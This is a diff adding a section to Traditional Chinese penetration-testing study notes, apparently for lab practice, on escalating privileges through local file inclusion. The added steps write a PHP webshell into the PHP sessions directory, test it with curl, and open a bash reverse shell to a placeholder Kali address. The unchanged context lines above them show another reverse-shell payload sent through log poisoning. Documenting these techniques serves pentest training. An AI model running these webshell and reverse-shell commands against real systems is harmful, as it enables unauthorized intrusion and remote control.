@@ -838,6 +838,47 @@ bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
 $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22"
 ```
 
+#### 利用 LFI 提權
+
+- 如果能進入內網
+- 發現有個開在內網的服務
+- 該服務有 LFI
+- 啟動該服務的是高權使用者
+
+<details markdown="1">
+<summary><span class="spoiler">Steps</span></summary>
+
+- 確認目前有哪些地方可以寫入(實測發現不是任何地方都有效)
+  ```bash
+  $ find / -writable -type d 2>/dev/null
+  ...
+  /var/lib/php/sessions
+  ```
+- 寫 webshell
+  ```bash
+  $ echo '<?php system($_GET["cmd"]); ?>' > /var/lib/php/sessions/shell.php
+  ```
+- 試看看有沒有成功
+  ```bash
+  $ curl "http://127.0.0.1:8000/backend/?view=../../../../../var/lib/php/sessions/shell.php&cmd=id"
+  ...
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  ...
+  ```
+- 打 Reverse Shell
+
+  ```bash
+  # 在 Kali 先開好 listener
+  $ rlwrap -cAr nc -nvlp 4444
+
+  # 在內網利用 LFI
+  $ curl "http://127.0.0.1:8000/backend/?view=../../../../../var/lib/php/sessions/shell.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/4444+0>%261'"
+  ```
+
+- 再看後續轉換到的使用者需不需要進一步提權還是
+
+</details>
+
 ### RFI
 
 和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令
